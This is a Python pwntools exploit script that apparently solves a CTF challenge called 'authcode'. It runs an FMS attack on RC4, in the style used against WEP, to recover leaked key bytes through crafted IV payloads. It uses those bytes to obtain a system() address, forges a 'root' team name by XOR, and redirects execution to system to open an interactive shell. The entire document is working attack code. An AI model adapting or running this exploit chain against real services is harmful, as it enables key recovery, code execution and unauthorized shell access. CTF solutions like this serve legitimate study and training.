from pwn import *
import sys
from rc4 import *

known = b''
plainSNAP = "aa"

if __debug__:
	r = process("stdbuf -i 0 -o 0 ./authcode".split())
else:
	HOST = 'ctf.ssat.site'
	PORT = 31501
	r = remote(HOST, PORT)

def request_ct(buf):
	global r

	## set team size
	payload = bytes([0, 255, 255, 255]) + buf + b"\xff"
	payload = u64(payload) - (1 << 64)
	r.sendlineafter(b"> ", b"2")
	r.sendlineafter(b"> ", str(payload).encode())

	## request authcode
	r.sendlineafter(b"> ", b"3")
	r.sendlineafter(b"> ", b"-1")

	r.recvuntil("Auth Code")
	m = r.readline()

	return int(m.split(b"): ")[1][:2], 16)


## set team name
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", bytes.fromhex(plainSNAP * 4))

def FMS_attack(r):
	box = []

	# In WEP, the header of SNAP is always 'aa'.

	key = list(b'000' + known)
	A = len(key) - 3
	for _ in range(13):
		prob = [0] * 256
		for r2 in range(1, 256):
			print(r2, end='')
			sys.stdout.buffer.write(b"\r")

			key[0] = A + 3
			key[1] = 255
			key[2] = r2

			r3 = request_ct(bytes(key[:3]))

			j = 0
			initSBox(box)

			# Simulate the S-Box after KSA initialization.
			for i in range(A + 3):
				j = (j + box[i] + key[i]) % 256
				swapValueByIndex(box, i, j)
				# Record the original box[0] and box[1] value.
				if i == 1:
					original0 = box[0]
					original1 = box[1]

			i = A + 3
			z = box[1]
			# if resolved condition is possibly met.
			if z + box[z] == A + 3:
				# If the value of box[0] and box[1] has changed, discard this possibility.
				if (original0 != box[0] or original1 != box[1]):
					continue
				keyStreamByte = r3 ^ int(plainSNAP, 16)
				keyByte = (keyStreamByte - j - box[i]) % 256
				prob[keyByte] += 1
				#if prob[keyByte] == 8:	#generally 0~3 except max(15~16), after full search
				#	break

		# Assume that the most hit is the correct password.
		higherPossibility = prob.index(max(prob))
		key.append(higherPossibility)

		A += 1
	return bytes(key[3:])

system_addr = u64(FMS_attack(r)[-8:])

r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"> ", b"-15")

## request authcode
r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"> ", b"0")

m = bytes.fromhex(r.readline().split(b"): ")[1].strip().decode())

team_name = xor(xor(m[:4], bytes.fromhex(plainSNAP * 4)), "root")

print(team_name)

## change team name
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", team_name)

## request authcode
r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"> ", b"0")

## call exit and system function
r.sendlineafter(b"> ", b"4")
if b"bye" in r.readline():
	print("Cracking failed. Try again.")
else:
	r.sendline(str(system_addr).encode())
	r.interactive()
